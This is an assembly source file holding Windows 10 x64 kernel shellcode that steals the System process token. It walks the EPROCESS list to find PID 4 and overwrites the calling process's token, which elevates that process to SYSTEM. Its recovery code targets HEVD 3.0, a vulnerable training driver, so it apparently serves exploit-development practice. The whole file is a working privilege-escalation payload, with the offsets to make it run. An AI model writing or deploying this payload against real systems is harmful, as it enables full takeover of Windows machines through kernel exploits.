; nasm -f bin -o tokensteal_win10_x64.bin shellcode.asm
; Grant System account privilages to calling process

BITS 64

section .text

start:
    push rdx
    push r8
    push r9
    xor rax, rax
    mov rdx, [gs:0x188]   ; Get _KTHREAD pointer from KPCR+0x180->KPRCB+0x8
    mov r8, [rdx+0xb8]   ; Get _EPROCESS from _KTHREAD
    mov r9, [r8+0x448]    ; ActiveProcessLinks list head

    mov rcx, [r9]        ; Follow link to first process in list

    find_system_proc:
        mov rdx, [rcx-8]     ; Offset from ActiveProcessLinks to UniqueProcessId
        cmp rdx, 4           ; Process with ID 4 is System process
        jz found_it
        mov rcx, [rcx]       ; Follow _LIST_ENTRY Flink pointer
        cmp rcx, r9          ; See if back at list head
        jnz find_system_proc
        db 0cch              ; (int 3) Process #4 not found (Should never happen)

    found_it:
        mov rax, [rcx+0x70]   ; Offset from ActiveProcessLinks to Token
        and al, 0x0f0         ; clear low 4 bits of _EX_FAST_REF structure
        mov [r8+0x4b8], rax   ; replace current process token with system token

        ; Kernel Driver HEVD 3.0 Recovery
        xor rsi, rsi         ; Avoid crash
        xor rdi, rdi         ; Avoid crash
        xor r15, r15         ; Avoid crash
        xor r14, r14         ; Avoid crash
        xor r12, r12         ; Avoid crash
        xor rax, rax         ; Set NTSTATUS SUCCESS
        add rsp, 0x28
        pop rdx
        pop r8
        pop r9
        ret
